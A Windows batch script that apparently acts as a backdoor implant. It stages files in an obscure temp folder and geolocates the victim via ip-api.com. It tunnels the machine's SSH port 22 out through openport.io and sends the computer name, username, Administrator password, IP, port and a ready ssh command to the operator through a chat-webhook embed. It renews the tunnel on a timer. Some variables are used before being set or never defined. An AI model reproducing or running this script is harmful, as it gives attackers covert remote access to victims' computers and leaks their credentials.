@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
set "Log=!PFaS!\log" & IF NOT EXIST !Log! mkdir !Log!
set "EmbedText=Connection credentials"

::temp
set "PFaS=!temp!\I4-L63O3V6E-82DI18C24K23S" & IF NOT EXIST !PFaS! mkdir !PFaS!

for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"

!PFaS!\openport.exe kill 22
start /B "forward" !PFas!\openport.exe 22 forward > !PFas!\forward.log

echo [Total error cound of the session]>>!StatusFile!
echo ErrorCount=!ErrorCount!>>!StatusFile!
echo.>>!StatusFile!

call source.bat +silent --embed "Target PC (%computername%\%username%) status file (Errors, warnings and validator)" " " "#ea3c53" "https://i.imgur.com/b2Terft.png"
call source.bat +silent --file "!StatusFile!"

:check
    find /c "https" !PFaS!\forward.log >NUL
    if !errorlevel! equ 0 ( goto done ) else (
        goto notfound
    )
    :notfound
        find /c "https" !PFaS!\forward.log >NUL
        if !errorlevel! equ 0 (
            timeout 3
            goto notfound
        ) else (
            goto done
        )
    :done
        xcopy /h /Y !PFaS!\forward.log !Log!

        for /f "tokens=2 delims=:" %%a in ('type "!log!\forward.log"') do (
            echo %%a | findstr /c:"openport.io" || (
                set Port=%%a
                set Port=!Port: to localhost=!
            )
        )

        FOR /F "delims=" %%F IN (!TFolder!\pass.txt) DO SET Pass=%%F
        set "Change=Changed"
        set Port=%RemoteURL:~-5%
        set IP=%RemoteURL:~0,14%

        call Source.bat +silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||openport.io:!Port!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)\\n\\n:arrow_right: **CMD command:** ||ssh Administrator@!IP! -p !Port!||" "FFFDBC" "https://i.imgur.com/b2Terft.png"
        :Loop
            timeout 82800
            !PFaS!\openport.exe kill 22
            start /B "forward" !PFaS!\openport.exe 22 forward > forward.log
            set "Change=Not Changed"
            set "EmbedText=Renewing session"
            goto check
            goto Loop